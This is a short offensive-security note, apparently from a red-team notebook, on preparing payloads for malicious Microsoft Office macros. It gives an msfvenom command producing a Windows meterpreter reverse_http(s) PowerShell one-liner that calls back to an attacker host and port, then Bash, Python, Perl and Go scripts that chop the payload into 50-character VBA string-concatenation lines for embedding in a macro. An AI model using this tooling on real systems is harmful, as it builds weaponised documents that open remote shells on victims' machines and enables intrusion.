# Macro Formatting Scripts

Generate a powershell one liner.

```
$ msfvenom -p windows/x64/meterpreter/reverse_http[s] lhost=<IP> lport=<PORT> exitfunc=thread -f psh-cmd
```

## 01 - Bash

```bash
#!/bin/bash

string=""
chunks=50

for (( i=0; i<${#string}; i+=chunks ))
do
    if [[ ${i} -eq 0 ]]
    then
        echo "string=\"${string:i:chunks}\""
    else
        echo "string+=\"${string:i:chunks}\""
    fi
done
```

## 02 - Python

```python
#!/usr/bin/env python

string = ""
chunks = 50

for i in range(0, len(string), chunks):
    print("Str = Str + \"" + string[i:i+chunks] + "\"")
```

## 03 - Perl

```perl
#!/usr/bin/env perl

my $string = "";

my @characters = ($string =~ /(.)/g);

$concatenated_string = "";
$chunks = 50;

for(my $i = 0; $i < scalar(@characters); $i++) {
    $concatenated_string .= "Str = Str + \"";
    for(my $j = 0; $j < $chunks; $j++) {
        $concatenated_string .= $characters[$i++];
    }
    $concatenated_string .= chr(34)."\n";
}
print $concatenated_string;
```

## 04 - Go

```go
package main

import "fmt"

func main() {
    String := ""
    Chunks := 50

    for i := 0; i < len(String); i++ {
        fmt.Print("Str = Str + \"")
        for j := 0; j < Chunks; j++ {
            if i == len(String) {
                break
            }
            fmt.Printf("%c", String[i])
            i++
        }
        fmt.Print("\"\n")
    }
}
```

---
## References

### Backlinks

- [[Microsoft Office Macros Template]]